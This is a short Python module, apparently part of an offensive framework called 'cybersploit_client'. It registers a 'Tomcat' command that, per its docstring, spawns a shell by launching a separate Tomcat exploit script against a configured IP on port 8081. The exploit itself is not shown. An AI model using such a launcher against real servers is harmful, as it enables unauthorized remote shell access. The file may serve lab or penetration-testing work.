from ..commands import Command 
from ..util.config import DEFAULT_IP
import subprocess
import shlex

class Tomcat(Command):
    """
    Spawn shell via Apache Tomcat exploit.
    """
    
    def do_command(self, lines: str):
        cmd_string = f"python3 cybersploit_client/tomcat_exploit.py -u http://{DEFAULT_IP}:8081 -p pwn"
        args = shlex.split(cmd_string)
        subprocess.run(args) 
 

command = Tomcat 